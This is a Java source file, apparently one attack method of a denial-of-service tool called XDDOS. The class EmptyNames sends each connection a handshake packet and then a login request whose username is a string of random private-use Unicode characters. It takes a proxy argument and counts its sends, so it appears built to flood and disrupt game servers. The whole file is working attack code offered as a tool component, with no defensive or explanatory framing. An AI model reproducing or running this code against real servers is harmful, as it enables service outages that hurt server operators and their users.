package XD.XDDOS.methods.impl;

import java.util.Random;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class EmptyNames
implements IMethod{

    private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
    String name = "";
    public Random rand = new Random();
    @Override
    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));

    for (int i = 0; i < 13; i++) {
      name = name + this.get();
    }
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(name)).getWrappedPacket()));
    channel.writeAndFlush(Unpooled.buffer().writeByte(1));
    NettyBootstrap.integer++;
  }
  public String get() {
    return this.rand.nextBoolean() ? "\ue000" : "\ue001";
}
}


